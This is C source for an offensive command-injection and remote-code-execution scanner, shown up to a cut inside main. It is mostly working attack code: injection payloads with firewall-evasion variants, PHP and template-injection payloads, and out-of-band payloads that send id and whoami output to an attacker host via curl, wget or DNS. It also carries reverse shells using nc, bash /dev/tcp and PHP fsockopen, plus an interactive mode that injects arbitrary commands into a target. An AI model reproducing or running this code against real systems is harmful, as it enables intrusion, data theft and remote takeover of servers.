#define _POSIX_C_SOURCE 199309L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>

#define MARKER "H4CK1T_1749"
#define BUFLEN 32768
#define MAX_PARAMS 128
#define MAX_LINE 8192
#define MAX_HEADERS 32
#define MAX_RESULTS 256

typedef struct {
    char url[2048];
    char cmd[512];
    char data[4096];
    char param[256];
    char method[8];
    char proxy[512];
    char cookie[2048];
    char ua[512];
    char oob[512];
    char tech[32];
    char headers[MAX_HEADERS][256];
    int header_count;
    int timeout;
    int threads;
    int delay;
    int retries;
    int detect;
    int exploit;
    int blind;
    int all;
    int json;
    int verbose;
    int shell;
} Args;

typedef struct {
    int vulnerable;
    char url[2048];
    char parameter[256];
    char method[16];
    char payload[2048];
    char command[512];
    char output[4096];
    double confidence;
    char engine[16];
    char technique[64];
} Result;

typedef struct {
    char name[64];
    char value[4096];
} Param;

typedef struct {
    char host[512];
    char path[4096];
    int port;
    int use_ssl;
} ParsedURL;

void parse_url(const char *url_str, ParsedURL *purl) {
    memset(purl, 0, sizeof(ParsedURL));
    purl->port = 80;
    if (strncmp(url_str, "https://", 8) == 0) {
        purl->use_ssl = 1; purl->port = 443;
        sscanf(url_str + 8, "%511[^/]%4095[^\n]", purl->host, purl->path);
    } else if (strncmp(url_str, "http://", 7) == 0) {
        sscanf(url_str + 7, "%511[^/]%4095[^\n]", purl->host, purl->path);
    } else {
        sscanf(url_str, "%511[^/]%4095[^\n]", purl->host, purl->path);
    }
    if (strlen(purl->path) == 0) strcpy(purl->path, "/");
    char *colon = strchr(purl->host, ':');
    if (colon) { *colon = '\0'; purl->port = atoi(colon + 1); }
}

long long get_time_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

void msleep(int ms) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

char* url_encode(const char *s) {
    static char buf[8192];
    char *p = buf;
    for (const char *c = s; *c && p - buf < 8000; c++) {
        if (isalnum((unsigned char)*c) || *c == '-' || *c == '_' || *c == '.' || *c == '~')
            *p++ = *c;
        else if (*c == ' ')
            *p++ = '+';
        else
            p += sprintf(p, "%%%02X", (unsigned char)*c);
    }
    *p = '\0';
    return buf;
}

int http_request(const char *host, int port, int use_ssl, const char *request,
                 char *response, int resp_len, int timeout) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    struct timeval tv;
    tv.tv_sec = timeout; tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct hostent *server = gethostbyname(host);
    if (!server) { close(sock); return 0; }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
    addr.sin_port = htons(port);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(sock); return 0; }
    int sent = send(sock, request, strlen(request), 0);
    if (sent < 0) { close(sock); return 0; }
    memset(response, 0, resp_len);
    int total = 0, n;
    while ((n = recv(sock, response + total, resp_len - total - 1, 0)) > 0) {
        total += n;
        if (total >= resp_len - 1) break;
    }
    response[total] = '\0';
    close(sock);
    char *body = strstr(response, "\r\n\r\n");
    if (body) memmove(response, body + 4, strlen(body + 4) + 1);
    return 1;
}

void build_request_ex(Args *args, ParsedURL *purl, const char *param, const char *payload,
                      char *req, int req_len) {
    char query[32768] = "";
    char qcopy[32768];
    char path[32768];
    int has_existing_q = 0;
    strcpy(path, purl->path);
    char *q = strchr(path, '?');
    if (q) {
        *q = '\0';
        strcpy(qcopy, q + 1);
        has_existing_q = 1;
    }
    if (strcmp(args->method, "GET") == 0 || (strcmp(args->method, "POST") != 0 && strlen(args->data) == 0)) {
        if (has_existing_q) {
            char *tok = strtok(qcopy, "&");
            while (tok) {
                if (strlen(query) > 0) strcat(query, "&");
                char *eq = strchr(tok, '=');
                if (eq) {
                    *eq = '\0';
                    if (strcmp(tok, param) == 0)
                        sprintf(query + strlen(query), "%s=%s", param, url_encode(payload));
                    else
                        sprintf(query + strlen(query), "%s=%s", tok, url_encode(eq + 1));
                    *eq = '=';
                } else {
                    if (strcmp(tok, param) == 0)
                        sprintf(query + strlen(query), "%s=%s", param, url_encode(payload));
                    else
                        sprintf(query + strlen(query), "%s", tok);
                }
                tok = strtok(NULL, "&");
            }
            if (strlen(query) == 0) sprintf(query, "%s=%s", param, url_encode(payload));
        } else {
            sprintf(query, "%s=%s", param, url_encode(payload));
        }
        snprintf(path, sizeof(path), "%s?%s", purl->path[0] ? purl->path : "/", query);
    }

    char body[32768] = "";
    if (strcmp(args->method, "POST") == 0 || strlen(args->data) > 0) {
        if (strlen(args->data) > 0) {
            strcpy(body, args->data);
            char *bq = strstr(body, param);
            if (bq) {
                char *beq = strchr(bq, '=');
                if (beq) {
                    beq++;
                    char *bend = strchr(beq, '&');
                    const char *enc = url_encode(payload);
                    if (bend) {
                        size_t enclen = strlen(enc);
                        memmove(bend + enclen - (bend - beq), bend, strlen(bend) + 1);
                        memmove(beq, enc, enclen);
                    } else {
                        strcpy(beq, enc);
                    }
                }
            } else {
                strcat(body, "&");
                strcat(body, param);
                strcat(body, "=");
                strcat(body, url_encode(payload));
            }
        } else {
            sprintf(body, "%s=%s", param, url_encode(payload));
        }
    }

    char extra_hdrs[32768] = "";
    for (int i = 0; i < args->header_count; i++) {
        strcat(extra_hdrs, args->headers[i]);
        strcat(extra_hdrs, "\r\n");
    }

    snprintf(req, req_len,
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "%s%s"
        "%s"
        "%s"
        "Connection: close\r\n",
        strlen(body) > 0 ? "POST" : "GET",
        path, purl->host,
        strlen(args->ua) > 0 ? args->ua : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        strlen(args->cookie) > 0 ? "Cookie: " : "",
        strlen(args->cookie) > 0 ? args->cookie : "",
        extra_hdrs,
        strlen(body) > 0 ? "Content-Type: application/x-www-form-urlencoded\r\n" : ""
    );

    if (strlen(body) > 0) {
        char cl[64];
        snprintf(cl, sizeof(cl), "Content-Length: %zu\r\n", strlen(body));
        strcat(req, cl);
    }
    strcat(req, "\r\n");
    if (strlen(body) > 0) strcat(req, body);
}

int send_payload_ex(Args *args, const char *param, const char *payload,
                    char *response, int resp_len) {
    ParsedURL purl;
    parse_url(args->url, &purl);
    char req[32768];
    build_request_ex(args, &purl, param, payload, req, sizeof(req));
    return http_request(purl.host, purl.port, purl.use_ssl, req, response, resp_len, args->timeout);
}

int test_time(Args *args, const char *param, int sleep_sec) {
    long long start, elapsed;
    char response[BUFLEN];

    // sleep() wrappers
    const char *sleep_wrappers[] = {
        ";sleep(%d);", "|sleep(%d)|", "`sleep(%d)`", "$(sleep(%d))", "&sleep(%d)&",
        "';sleep(%d);'", "\";sleep(%d);\"", "${sleep(%d)}", "%%0asleep(%d)%%0a",
        NULL
    };
    for (int i = 0; sleep_wrappers[i]; i++) {
        char payload[256];
        snprintf(payload, sizeof(payload), sleep_wrappers[i], sleep_sec);
        for (int r = 0; r < (args->retries > 0 ? args->retries : 1); r++) {
            start = get_time_ms();
            int ok = send_payload_ex(args, param, payload, response, sizeof(response));
            elapsed = get_time_ms() - start;
            if (ok && elapsed >= (sleep_sec * 1000LL * 70LL / 100LL)) return 1;
            if (args->delay > 0) msleep(args->delay);
        }
    }

    // ping-based timing
    const char *ping_templates[] = {
        ";ping -c %d 127.0.0.1;", "&ping -c %d 127.0.0.1&",
        NULL
    };
    for (int i = 0; ping_templates[i]; i++) {
        char payload[256];
        snprintf(payload, sizeof(payload), ping_templates[i], sleep_sec);
        start = get_time_ms();
        int ok = send_payload_ex(args, param, payload, response, sizeof(response));
        elapsed = get_time_ms() - start;
        if (ok && elapsed >= (sleep_sec * 1000LL * 70LL / 100LL)) return 1;
    }

    // Windows ping
    char winping[256];
    snprintf(winping, sizeof(winping), "|ping -n %d 127.0.0.1|", sleep_sec);
    start = get_time_ms();
    int ok = send_payload_ex(args, param, winping, response, sizeof(response));
    elapsed = get_time_ms() - start;
    if (ok && elapsed >= (sleep_sec * 1000LL * 70LL / 100LL)) return 1;

    return 0;
}

int test_output(Args *args, const char *param) {
    char response[BUFLEN];
    const char *wrappers[] = {
        ";echo %s;", "|echo %s|", "`echo %s`", "$(echo %s)", "&echo %s&",
        "%%0aecho %s%%0a", "%%0d%%0aecho %s%%0d%%0a",
        "\\necho %s\\n", "\\r\\necho %s\\r\\n",
        ";echo\t%s;", ";echo %s;",
        "';echo %s;'", "\";echo %s;\"",
        "${echo %s}",
        "';\"echo %s\";'", "\"'echo %s'\"",
        "'\\\";echo %s;\"\\'", "\"\\';echo %s;'\\\"",
        ";echo %s #", "|echo %s #", "`echo %s` #", "$(echo %s) #",
        ";echo %s %%23", ";echo %s <!--", ";echo %s /*", ";echo %s --",
        "|cmd /c echo %s|", ";cmd /c echo %s;", "&cmd /c echo %s&",
        "&powershell -c \"echo %s\" &", ";powershell -c \"echo %s\" ;", "|powershell -c \"echo %s\" |",
        ";echo %s;echo DONE;", "&&echo %s&&", "||echo %s||", ";echo %s||echo FAIL;",
        NULL
    };
    for (int i = 0; wrappers[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), wrappers[i], MARKER);
        for (int r = 0; r < (args->retries > 0 ? args->retries : 1); r++) {
            if (send_payload_ex(args, param, payload, response, sizeof(response))) {
                if (strstr(response, MARKER)) return 1;
            }
            if (args->delay > 0) msleep(args->delay);
        }
    }

    // WAF bypass — character splitting
    const char *waf1[] = {
        ";e`cho` %s;", ";e$(cho) %s;", "';'e'c'h'o' '%s';'",
        ";e\\c\\h\\o %s;", ";e''cho %s;", ";e\"\"cho %s;",
        ";ech$()o %s;", ";e\"$@\"cho %s;", ";e\"$*\"cho %s;",
        ";e${x}cho %s;", ";prin\\ntf '%%s\\n' %s;",
        NULL
    };
    for (int i = 0; waf1[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), waf1[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }

    // WAF bypass — wildcard/glob
    const char *waf2[] = {
        ";/???/echo %s;", ";/bi?/echo %s;", ";/usr/bin/ech? %s;",
        NULL
    };
    for (int i = 0; waf2[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), waf2[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }

    // WAF bypass — case obfuscation
    const char *waf3[] = {
        ";EcHo %s;", ";ECHO %s;", ";eChO %s;",
        NULL
    };
    for (int i = 0; waf3[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), waf3[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }

    // WAF bypass — base64/hex/oct encoded
    const char *waf4[] = {
        ";echo %s|base64 -d|bash;", ";echo %s|base64 --decode|sh;",
        ";python3 -c \"import base64;exec(base64.b64decode('%s'))\";",
        ";perl -e \"use MIME::Base64;print decode_base64('%s')\";",
        NULL
    };
    for (int i = 0; waf4[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), waf4[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }

    // WAF bypass — encoding, env var, double/triple encode, whitespace
    if (send_payload_ex(args, param, ";${PATH:0:1}cho $HOME;", response, sizeof(response))) {
        if (strstr(response, "$HOME") || strstr(response, "/")) return 1;
    }
    const char *waf5[] = {
        "%%253becho %s%%253b", "%%25253becho %s%%25253b",
        ";echo\\t%s;",
        ";e\\fcho %s;", ";e\\rcho %s;",
        NULL
    };
    for (int i = 0; waf5[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), waf5[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }

    // WAF bypass — exec builtins
    if (send_payload_ex(args, param, ";exec echo H4CK1T;", response, sizeof(response))) {
        if (strstr(response, "H4CK1T")) return 1;
    }
    if (send_payload_ex(args, param, ";source /dev/stdin <<< \"echo H4CK1T\";", response, sizeof(response))) {
        if (strstr(response, "H4CK1T")) return 1;
    }

    return 0;
}

int test_php_specific(Args *args, const char *param) {
    char response[BUFLEN];
    const char *php[] = {
        "<?php echo '%s'; ?>", "<?= '%s' ?>",
        "<?php system('echo %s'); ?>",
        "<?php exec('echo %s',$o);print(implode(\"\\n\",$o)); ?>",
        "<?php shell_exec('echo %s'); ?>",
        "<?php passthru('echo %s'); ?>",
        "<?php $a=array(0=>'%s');echo implode($a); ?>",
        "<?php eval('echo \"%s\";'); ?>",
        "<?php assert('print \"%s\"'); ?>",
        "<?php preg_replace('/.*/e','print \"%s\"',''); ?>",
        "<?php $_='%s';echo$_; ?>",
        NULL
    };
    for (int i = 0; php[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), php[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }
    // PHP via CLI
    const char *php_cli[] = {
        ";php -r 'echo \"%s\";' ;",
        NULL
    };
    for (int i = 0; php_cli[i]; i++) {
        char payload[512];
        snprintf(payload, sizeof(payload), php_cli[i], MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER)) return 1;
        }
    }
    return 0;
}

int test_shell_variants(Args *args, const char *param) {
    char response[BUFLEN];
    const char *shells[] = {
        ";perl -e 'print \"%s\"' ;",
        ";python3 -c 'print(\"%s\")' ;",
        ";python -c 'print(\"%s\")' ;",
        ";ruby -e 'puts \"%s\"' ;",
        ";node -e 'console.log(\"%s\")' ;",
        ";lua -e 'print(\"%s\")' ;",
        ";awk 'BEGIN{print \"%s\"}' ;",
        ";tclsh -c 'puts \"%s\"' ;",
        ";groovy -e 'println \"%s\"' ;",
        ";zsh -c 'echo %s' ;",
        ";dash -c 'echo %s' ;",
        ";ksh -c 'echo %s' ;",
        ";csh -c 'echo %s' ;",
        ";irb -e 'puts \"%s\"' ;",
        ";psql -c \"SELECT '%s'\" ;",
        ";mysql -e \"SELECT '%s'\" ;",
        ";sqlite3 :memory: \"SELECT '%s'\" ;",
        ";gdb -batch -ex 'print \"%s\"' -ex quit;",
        NULL
    };
    for (int i = 0; shells[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), shells[i], MARKER);
        for (int r = 0; r < (args->retries > 0 ? args->retries : 1); r++) {
            if (send_payload_ex(args, param, payload, response, sizeof(response))) {
                if (strstr(response, MARKER)) return 1;
            }
            if (args->delay > 0) msleep(args->delay);
        }
    }
    return 0;
}

int test_ssti(Args *args, const char *param) {
    char response[BUFLEN];
    const char *ssti[] = {
        // Twig
        "{{7*7}}", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}",
        // Jinja2
        "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
        // Freemarker
        "${7*7}", "${T(java.lang.Runtime).getRuntime().exec('echo H4CK1T')}",
        // Velocity
        "#set($x=7*7)$x",
        // Jade
        "#{7*7}",
        // ERB
        "<%= 7*7 %>", "<%= system('echo H4CK1T') %>",
        // Tornado
        "{% import os %}{{os.system('echo H4CK1T')}}",
        // Smarty
        "{system('echo H4CK1T')}",
        NULL
    };
    for (int i = 0; ssti[i]; i++) {
        for (int r = 0; r < (args->retries > 0 ? args->retries : 1); r++) {
            if (send_payload_ex(args, param, ssti[i], response, sizeof(response))) {
                if (strstr(response, "49") || strstr(response, "H4CK1T") || strstr(response, "root")) return 1;
            }
            if (args->delay > 0) msleep(args->delay);
        }
    }
    return 0;
}

int test_header_injection(Args *args, const char *param) {
    char response[BUFLEN];
    const char *hdrs[] = {
        "\\necho H4CK1T\\n",
        "\\r\\necho H4CK1T\\r\\n",
        "'\\necho H4CK1T\\n'",
        "\"\\necho H4CK1T\\n\"",
        "%0aX-Custom:%20H4CK1T",
        "X-Forwarded-For: 127.0.0.1%0aX-Cmd:%20echo%20H4CK1T",
        NULL
    };
    for (int i = 0; hdrs[i]; i++) {
        if (send_payload_ex(args, param, hdrs[i], response, sizeof(response))) {
            if (strstr(response, "H4CK1T")) return 1;
        }
    }
    return 0;
}

int test_error(Args *args, const char *param) {
    char response[BUFLEN], baseline[BUFLEN] = "";
    send_payload_ex(args, param, "HACKIT_BASELINE_1749", baseline, sizeof(baseline));
    const char *error_payloads[] = {
        ";undefined_cmd_xyz_1749;", "|undefined_cmd_xyz_1749|",
        "$(undefined_cmd_xyz_1749)", "&undefined_cmd_xyz_1749&",
        "`undefined_cmd_xyz_1749`",
        ";cat /nonexistent_file_hackit_1749;", "|cat /nonexistent_file_hackit_1749|",
        ";type nonexistent_file_hackit_1749;",
        ";python -c \"1/0\";", ";perl -e \"1/0\";", ";php -r \"1/0;\";",
        ";ruby -e \"1/0\";",
        ";python -c \"a=[];print(a[99])\";",
        ";python -c \"import sys;sys.exit(1)\";",
        ";sh -c \"exit 1\";",
        NULL
    };
    const char *indicators[] = {
        "warning", "error", "unexpected", "not found", "command not found",
        "stack trace", "Fatal error", "exception", "Traceback", "Parse error",
        "syntax error", "undefined", "permission denied", "cannot execute",
        "division by zero", "index out of range",
        NULL
    };
    for (int i = 0; error_payloads[i]; i++) {
        if (send_payload_ex(args, param, error_payloads[i], response, sizeof(response))) {
            if (strcmp(response, baseline) == 0) continue;
            char resp_lower[BUFLEN];
            int j;
            for (j = 0; response[j]; j++)
                resp_lower[j] = tolower((unsigned char)response[j]);
            resp_lower[j] = '\0';
            for (int k = 0; indicators[k]; k++) {
                if (strstr(resp_lower, indicators[k])) return 1;
            }
        }
    }
    return 0;
}

int test_blind(Args *args, const char *param) {
    char response[BUFLEN], baseline[BUFLEN] = "";
    send_payload_ex(args, param, "HACKIT_BASELINE_1749", baseline, sizeof(baseline));

    const char *blind_payloads[] = {
        ";if echo %s; then echo %s; fi;",
        "|if echo %s; then echo %s; fi|",
        ";echo %s && echo %s;",
        ";echo %s || echo %s;",
        "&echo %s && echo %s&",
        "';if echo %s; then echo %s; fi;'",
        "\";if echo %s; then echo %s; fi;\"",
        "$(if echo %s; then echo %s; fi)",
        "`if echo %s; then echo %s; fi`",
        "|echo %s && echo %s #",
        ";echo %s && echo %s #",
        "|echo %s || echo %s #",
        "%%0aecho %s && echo %s%%0a",
        ";test -f /etc/passwd && echo %s;",
        ";test -d /root && echo %s;",
        ";which python && echo %s;",
        ";which curl && echo %s;",
        NULL
    };
    for (int i = 0; blind_payloads[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), blind_payloads[i], MARKER, MARKER);
        if (send_payload_ex(args, param, payload, response, sizeof(response))) {
            if (strstr(response, MARKER) && !strstr(baseline, MARKER)) return 1;
        }
    }
    return 0;
}

int test_oob(Args *args, const char *param) {
    if (strlen(args->oob) == 0) return 0;
    char response[BUFLEN];
    // HTTP OOB
    const char *oob_http[] = {
        ";curl -s http://%s/$(id|base64 -w0) &",
        "|curl -s http://%s/$(id|base64 -w0)|",
        ";wget -q -O- http://%s/$(id|base64 -w0) &",
        NULL
    };
    for (int i = 0; oob_http[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), oob_http[i], args->oob);
        send_payload_ex(args, param, payload, response, sizeof(response));
    }
    // DNS OOB
    const char *oob_dns[] = {
        ";nslookup $(whoami).%s &",
        ";dig +short $(hostname).%s &",
        ";ping -c 1 $(id).%s &",
        NULL
    };
    for (int i = 0; oob_dns[i]; i++) {
        char payload[1024];
        snprintf(payload, sizeof(payload), oob_dns[i], args->oob);
        send_payload_ex(args, param, payload, response, sizeof(response));
    }
    // Python/Perl OOB
    char pyoob[2048];
    snprintf(pyoob, sizeof(pyoob),
        ";python3 -c \"import urllib.request;urllib.request.urlopen('http://%s/'+__import__('base64').b64encode(__import__('os').popen('id').read().encode()).decode())\" &",
        args->oob);
    send_payload_ex(args, param, pyoob, response, sizeof(response));
    char ploob[2048];
    snprintf(ploob, sizeof(ploob),
        ";perl -e \"use LWP::Simple;getstore('http://%s/'.encode_base64('id'),'x')\" &",
        args->oob);
    send_payload_ex(args, param, ploob, response, sizeof(response));
    // Reverse shell OOB
    char rev1[1024];
    snprintf(rev1, sizeof(rev1), ";nc -e /bin/sh %s 4444 &", args->oob);
    send_payload_ex(args, param, rev1, response, sizeof(response));
    char rev2[1024];
    snprintf(rev2, sizeof(rev2), ";bash -i >& /dev/tcp/%s/4444 0>&1 &", args->oob);
    send_payload_ex(args, param, rev2, response, sizeof(response));
    char rev3[1024];
    snprintf(rev3, sizeof(rev3), "|bash -i >& /dev/tcp/%s/4444 0>&1|", args->oob);
    send_payload_ex(args, param, rev3, response, sizeof(response));
    char rev4[2048];
    snprintf(rev4, sizeof(rev4),
        ";php -r \"\\$sock=fsockopen('%s',4444);exec('/bin/sh -i <&3 >&3 2>&3');\" &",
        args->oob);
    send_payload_ex(args, param, rev4, response, sizeof(response));
    return 0;
}

void extract_params(Args *args, Param *params, int *count) {
    *count = 0;
    if (strlen(args->param) > 0) {
        strcpy(params[0].name, args->param);
        *count = 1;
        return;
    }
    char *q = strchr(args->url, '?');
    if (q) {
        q++;
        char qcopy[8192]; strcpy(qcopy, q);
        char *tok = strtok(qcopy, "&");
        while (tok && *count < MAX_PARAMS) {
            char *eq = strchr(tok, '=');
            if (eq) {
                *eq = '\0';
                strcpy(params[*count].name, tok);
                strcpy(params[*count].value, eq + 1);
                *eq = '=';
                (*count)++;
            }
            tok = strtok(NULL, "&");
        }
    }
    if (strlen(args->data) > 0) {
        char dcopy[4096]; strcpy(dcopy, args->data);
        char *tok = strtok(dcopy, "&");
        while (tok && *count < MAX_PARAMS) {
            char *eq = strchr(tok, '=');
            if (eq) {
                *eq = '\0';
                int found = 0;
                for (int i = 0; i < *count; i++) {
                    if (strcmp(params[i].name, tok) == 0) { found = 1; break; }
                }
                if (!found) {
                    strcpy(params[*count].name, tok);
                    (*count)++;
                }
                *eq = '=';
            }
            tok = strtok(NULL, "&");
        }
    }
    if (*count == 0 || args->all) {
        const char *defaults[] = {
            "q","id","cmd","exec","command","url","host","file","input","search",
            "c","code","lang","debug","action","process","run","system","shell",
            "page","dir","folder","path","cat","read","include","require","open",
            "doc","document","template","view","load","import","config","setting",
            "option","opt","key","token","pass","password","user","username","email",
            NULL
        };
        if (*count == 0) {
            for (int i = 0; defaults[i] && *count < MAX_PARAMS; i++)
                strcpy(params[(*count)++].name, defaults[i]);
        } else if (args->all) {
            int existing = *count;
            for (int i = 0; defaults[i] && *count < MAX_PARAMS; i++) {
                int dup = 0;
                for (int j = 0; j < existing; j++) {
                    if (strcmp(params[j].name, defaults[i]) == 0) { dup = 1; break; }
                }
                if (!dup) strcpy(params[(*count)++].name, defaults[i]);
            }
        }
    }
}

void print_json(Result *results, int count) {
    printf("[");
    for (int i = 0; i < count; i++) {
        if (i > 0) printf(",");
        printf("{\"vulnerable\":%s,\"url\":\"%s\",\"parameter\":\"%s\",\"method\":\"%s\","
               "\"payload\":\"%s\",\"command\":\"%s\",\"output\":\"%s\","
               "\"confidence\":%.4f,\"engine\":\"%s\",\"technique\":\"%s\"}",
               results[i].vulnerable ? "true" : "false",
               results[i].url, results[i].parameter, results[i].method,
               results[i].payload, results[i].command, results[i].output,
               results[i].confidence, results[i].engine, results[i].technique);
    }
    printf("]\n");
}

void print_plain(Result *results, int count) {
    for (int i = 0; i < count; i++) {
        if (results[i].vulnerable) {
            char output[256]; strncpy(output, results[i].output, 200); output[200] = '\0';
            for (char *p = output; *p; p++) if (*p == '\n') *p = ' ';
            printf("VULNERABLE|%s|%s|%s|%.4f|%s\n",
                   results[i].url, results[i].parameter, results[i].technique,
                   results[i].confidence, output);
        } else {
            printf("SAFE|%s|none|no_rce|0.0|Target appears secure\n", results[i].url);
        }
    }
    if (count > 0) {
        int vc = 0;
        for (int i = 0; i < count; i++) if (results[i].vulnerable) vc++;
        if (vc > 0) printf("SUMMARY|%d parameter(s) vulnerable|RCE CONFIRMED\n", vc);
        else printf("SUMMARY|0 vulnerabilities|Target secure\n");
    }
}

void shell_session(Args *args) {
    printf("[!] RCE SHELL ACTIVE — type 'exit' to quit\n");
    printf("[!] Target: %s\n", args->url);
    printf("[!] Engine: C\n");
    printf("[!] Commands are being injected into target parameters\n\n");

    Param params[MAX_PARAMS];
    int pcount = 0;
    extract_params(args, params, &pcount);

    char input[4096];
    while (1) {
        printf("$ ");
        fflush(stdout);
        if (!fgets(input, sizeof(input), stdin)) break;
        input[strcspn(input, "\n")] = 0;
        if (strcmp(input, "exit") == 0 || strcmp(input, "quit") == 0) break;
        if (strlen(input) == 0) continue;

        for (int p = 0; p < pcount; p++) {
            char response[BUFLEN];
            const char *wrappers[] = {
                ";%s;", "|%s|", "`%s`", "$(%s)", "&%s&",
                "';%s;'", "\";%s;\"", "${%s}", "%%0a%s%%0a",
                "%%0d%%0a%s%%0d%%0a", "&&%s&&", "||%s||",
                "&%s #", "|%s #", ";%s #",
                "&cmd /c %s &", ";powershell -c \"%s\" ;",
                NULL
            };
            for (int w = 0; wrappers[w]; w++) {
                char payload[4096];
                snprintf(payload, sizeof(payload), wrappers[w], input);
                if (send_payload_ex(args, params[p].name, payload, response, sizeof(response))) {
                    if (strlen(response) > 0) {
                        char *trim = response + strlen(response);
                        while (trim > response && (trim[-1] == '\n' || trim[-1] == '\r')) trim--;
                        *trim = '\0';
                        printf("%s\n", response);
                        break;
                    }
                }
            }
        }
    }
    printf("[!] Shell closed\n");
}

int main(int argc, char *argv[]) {
    Args args;
    memset(&args, 0, sizeof(args));
    strcpy(args.method, "GET");
    args.timeout = 10;
    args.threads = 20;
    strcpy(args.ua, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-u") == 0 && i+1 < argc) strcpy(args.url, argv[++i]);
        else if (strcmp(argv[i], "-c") == 0 && i+1 < argc) strcpy(args.cmd, argv[++i]);
        else if (strcmp(argv[i], "-d") == 0 && i+1 < argc) strcpy(args.data, argv[++i]);
        else if (strcmp(argv[i], "-p") == 0 && i+1 < argc) strcpy(args.param, argv[++i]);
        else if (strcmp(argv[i], "-m") == 0 && i+1 < argc) strcpy(args.method, argv[++i]);
        else if (strcmp(argv[i], "--timeout") == 0 && i+1 < argc) args.timeout = atoi(argv[++i]);
        else if (strcmp(argv[i], "-t") == 0 && i+1 < argc) args.threads = atoi(argv[++i]);
        else if (strcmp(argv[i], "--proxy") == 0 && i+1 < argc) strcpy(args.proxy, argv[++i]);
        else if (strcmp(argv[i], "--cookie") == 0 && i+1 < argc) strcpy(args.cookie, argv[++i]);
        else if (strcmp(argv[i], "--ua") == 0 && i+1 < argc) strcpy(args.ua, argv[++i]);
        else if (strcmp(argv[i], "--oob") == 0 && i+1 < argc) strcpy(args.oob, argv[++i]);
        else if (strcmp(argv[i], "--tech") == 0 && i+1 < argc) strcpy(args.tech, argv[++i]);
        else if (strcmp(argv[i], "--delay") == 0 && i+1 < argc) args.delay = atoi(argv[++i]);
        else if (strcmp(argv[i], "--retries") == 0 && i+1 < argc) args.retries = atoi(argv[++i]);
        else if (strcmp(argv[i], "--header") == 0 && i+1 < argc && args.header_count < MAX_HEADERS)
            strcpy(args.headers[args.header_count++], argv[++i]);
        else if (strcmp(argv[i], "--detect") == 0) args.detect = 1;
        else if (strcmp(argv[i], "--exploit") == 0) args.exploit = 1;
        else if (strcmp(argv[i], "--blind") == 0) args.blind = 1;
        else if (strcmp(argv[i], "--all") == 0) args.all = 1;
        else if (strcmp(argv[i], "--shell") == 0) args.shell = 1;
        else if (strcmp(argv[i], "--json") == 0) args.json = 1;
        else if (strcmp(argv[i], "--verbose") == 0) args.verbose = 1;
    }

    if (strlen(args.url) == 0) {
        fprintf(stderr, "{\"error\":\"target URL required (-u flag)\"}\n");
        return 1;
    }

    if (args.shell) {
        shell_session(&args);
        return 0;
    }

    Param *params = (Param*)calloc(MAX_PARAMS, sizeof(Param));
    int param_count = 0;
    extract_params(&args, params, &param_count);

    Result *results = (Result*)calloc(MAX_RESULTS, sizeof(Result));
    int result_count = 0;

    // Interpreter-based delays
    const char *interp_sleeps[] = {
        ";python -c \"import time;time.sleep(5)\";",
        ";perl -e \"sleep(5)\";",
        ";ruby -e \"sleep(5)\";",
        ";php -r \"sleep(5);\";",
        ";node -e \"setTimeout(()=>{},5000)\";",
        ";lua -e \"os.execute('sleep 5')\";",
        NULL
    };

    for (int p = 0; p < param_count && result_count < MAX_RESULTS; p++) {
        int vuln_found = 0;

        if (args.detect || (!args.exploit && strlen(args.cmd) == 0)) {
            // Tech-specific (PHP)
            if (strlen(args.tech) > 0 && strcmp(args.tech, "php") == 0) {
                if (test_php_specific(&args, params[p].name)) {
                    memset(&results[result_count], 0, sizeof(Result));
                    results[result_count].vulnerable = 1;
                    strcpy(results[result_count].url, args.url);
                    strcpy(results[result_count].parameter, params[p].name);
